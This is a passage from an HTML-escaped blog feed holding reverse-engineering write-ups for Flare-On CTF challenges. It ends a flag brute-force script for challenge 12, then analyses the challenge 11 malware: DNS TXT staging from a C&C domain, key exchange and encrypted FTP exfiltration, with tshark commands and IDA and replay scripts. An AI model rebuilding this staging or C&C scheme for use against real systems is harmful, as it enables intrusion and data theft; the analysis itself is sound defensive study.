class=&quot;mh&quot;&gt;0xd90c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf821&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf181&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf85f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pre_calc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pre_calc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'o'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'m'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;summ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length_var&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pre_calc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;summ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length_var&lt;/span&gt;
		
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'flag=&amp;gt; %s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you liked my writeup, please take a look at my &lt;a href=&quot;https://github.com/soolidsnake&quot;&gt;github repo&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Flare-on challenge 11</title><link href="http://localhost:4000/2018/10/02/flare-on5-chall11.html" rel="alternate" type="text/html" title="Flare-on challenge 11" /><published>2018-10-02T12:08:00-05:00</published><updated>2018-10-02T12:08:00-05:00</updated><id>http://localhost:4000/2018/10/02/flare-on5-chall11</id><content type="html" xml:base="http://localhost:4000/2018/10/02/flare-on5-chall11.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;We captured some malware traffic, and the malware we think was responsible. 
You know the drill, if you reverse engineer and decode everything 
appropriately you will reveal a hidden message. 
This challenge thinks its the 9th but it turned out too hard, 
so we made it the 11th.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: I’m sorry the writeup is a bit messy, I couldn’t find the time to write it properly, if you have any question please contact me, have fun :D
I will update it whenever I find some free time.&lt;/p&gt;

&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;

&lt;p&gt;The goal of this challenge is to analyze a malware and a given &lt;strong&gt;network packet capture&lt;/strong&gt; (pcap) that contains the communication of the malware with a &lt;strong&gt;C&amp;amp;C server&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;analyzing-the-pcap-part-and-the-malware&quot;&gt;Analyzing the pcap part and the malware&lt;/h2&gt;

&lt;p&gt;We can see that there are 4 important tcp streams and many dns queries for TXT record, let’s see that in depth:&lt;/p&gt;

&lt;h3 id=&quot;udp-queries&quot;&gt;UDP QUERIES:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dnsquery_all.png&quot; alt=&quot;dnsquery_all&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that the malware query TXT record of different subdomains starting from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.asdflkjsadf.notatallsuspicio.us&lt;/code&gt; then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aab.asdflkjsadf.notatallsuspicio.us&lt;/code&gt; etc…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dns_base64.png&quot; alt=&quot;dns_base64&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the query response contains a base64 encoded data.&lt;/p&gt;

&lt;h3 id=&quot;tcp-streams&quot;&gt;TCP STREAMS:&lt;/h3&gt;
&lt;h4 id=&quot;tcp-stream-0&quot;&gt;tcp stream 0:&lt;/h4&gt;

&lt;p&gt;Contains some encrypted data of different size, but we notice that the first 2 exchanged packets are of the same size: &lt;strong&gt;0x30&lt;/strong&gt; which might be a key exchange between the two entities.
the next picture shows the first &lt;strong&gt;0x30&lt;/strong&gt; data sent from the malware to the &lt;strong&gt;C&amp;amp;C&lt;/strong&gt;
&lt;img src=&quot;/assets/img/flare-on/chall11/key_malware_c&amp;amp;c.png&quot; alt=&quot;dns_base64&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/hex_stream0.png&quot; alt=&quot;hex_stream0&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;tcp-stream-2&quot;&gt;tcp stream 2:&lt;/h4&gt;

&lt;p&gt;Contains some SMBv2 encrypted data too, we can also notice that the first 2 packets have a data of size &lt;strong&gt;0x30&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;tcp-stream-5&quot;&gt;tcp stream 5&lt;/h4&gt;

&lt;p&gt;Contains some ftp communcation
&lt;img src=&quot;/assets/img/flare-on/chall11/ftp_communication.png&quot; alt=&quot;ftp_communication&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;tcp-stream-6&quot;&gt;tcp stream 6&lt;/h4&gt;

&lt;p&gt;Contains the uploaded file to the ftp server, notice the header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cryptar20180810&lt;/code&gt; before the encrypted part.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/ftp_data.png&quot; alt=&quot;ftp_communication&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;reverse-engineering-part&quot;&gt;Reverse engineering part&lt;/h2&gt;

&lt;p&gt;By using IDA we can identify the main function that is responsible for the dns query located which performs the following operations:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Allocate memory to save the base64 encoded data of all the subdomains that are queried&lt;/li&gt;
  &lt;li&gt;Query the TXT record of an url starting from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.asdflkjsadf.notatallsuspicio.us&lt;/code&gt;, and save the base64 encoded data in memory&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dnsquery.png&quot; alt=&quot;dnsquery&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Increment the subdomain: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aab.asdflkjsadf.notatallsuspicio.us&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/dns_domain_0.png&quot; alt=&quot;dns_domain_0&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Query the TXT record of that url, and concat it to the previous base64 data&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then it decrypt the base64, and jump to it.&lt;/p&gt;

&lt;p&gt;Here we can be lazy and avoid the decryption part by replacing the base64 data from pcap into memory and replacing the base64 data from the live server, we first extract the base64 encoded data with &lt;strong&gt;tshark&lt;/strong&gt; using the following command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tshark -r pcap.pcap -Y &quot;dns.flags == 0x8580 and dns.txt&quot; -T fields -e dns.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;then we can copy the data into memory using a python script inside IDA:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x021B0000&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# the address of the new allocated memory 
&lt;/span&gt;                  &lt;span class=&quot;c1&quot;&gt;# that contains the base64 encoded data
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'base64_encoded_data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;PatchByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# write a byte at memory pointed by &quot;start&quot;
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Next we have the second stage of the binary, after reversing it from top to bottom, we can see the following behaviour:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Initiate a socket to the &lt;strong&gt;C&amp;amp;C server&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Generate a &lt;strong&gt;0x30&lt;/strong&gt; bytes random key using CryptGenRandom&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/creating_random_key.png&quot; alt=&quot;creating_random_key&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Send the generated key to the server&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/send_malware_key.png&quot; alt=&quot;send_malware_key&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;receive another &lt;strong&gt;0x30&lt;/strong&gt; bytes key from the server&lt;/li&gt;
  &lt;li&gt;generate a new key by xoring each byte of the 2 keys and then xoring the result with the value &lt;strong&gt;0xAA&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After that, the malware, awaits data from the server, decrypt it with a cryptographic algorithm using the generated key, and then decompress the decrypted data with gzip.&lt;/p&gt;

&lt;p&gt;Let’s be a lazy reversers and use the malware as a decryptor of the pcap encrypted data !!!&lt;/p&gt;

&lt;p&gt;We have to simulate the communication using the pcap file data, first we have to extract the packets that are interesting for us by using tshark again:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tshark -r pcap.pcap -Y &quot;tcp.stream eq 0 &amp;amp;&amp;amp; data&quot; -T fields -e data&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;note: The key that is sent from the malware to the &lt;strong&gt;C&amp;amp;C&lt;/strong&gt; server must be removed, we will inject it manually into memory, we just need to receive the key from the server, to generate the final key.&lt;/p&gt;

&lt;p&gt;Then add an entry to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hosts&lt;/code&gt; file and point the domain name to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The following script reads the extracted packets and send them to the connected client, the malware in our case.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;csock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'connected&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'stream0_data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;
